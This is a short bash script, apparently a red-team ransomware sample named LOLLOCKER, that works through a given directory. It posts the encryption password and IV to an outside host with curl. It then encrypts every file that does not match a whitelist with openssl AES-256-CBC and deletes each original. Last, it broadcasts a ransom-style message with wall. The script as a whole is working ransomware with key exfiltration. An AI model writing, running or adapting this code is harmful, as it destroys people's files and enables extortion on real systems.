if [ $# -ne 2 ]
then
	echo "Usage: ./lol.sh [pw] [dir1]"
else
	iv=`cat /dev/urandom | tr -cd 'A-F0-9' | head -c 32`
	pass=$1
	dirwalk=$2
	white_list=( cat wall echo bash ifconfig ls chmod rm openssl )
	re="$(printf '%s\n' "${white_list[@]}" | paste -sd '|')"
	files=`find $dirwalk -type f`
	curl --data "key=$pass&iv=$iv&msg=msg" https://droppersite.com
	for f in $files
	do
		if [[ ! $f =~ $re ]]; then
			outfile=$f.lol
			`openssl enc -aes-256-cbc -a -salt -in $f -out $outfile -pass pass:$pass -iv $iv`
			rm $f
		fi
	done
	echo "Yo! You've been infected by LOLLOCKER. Come schmooze redteam for the password! ;) ;)" | wall
fi
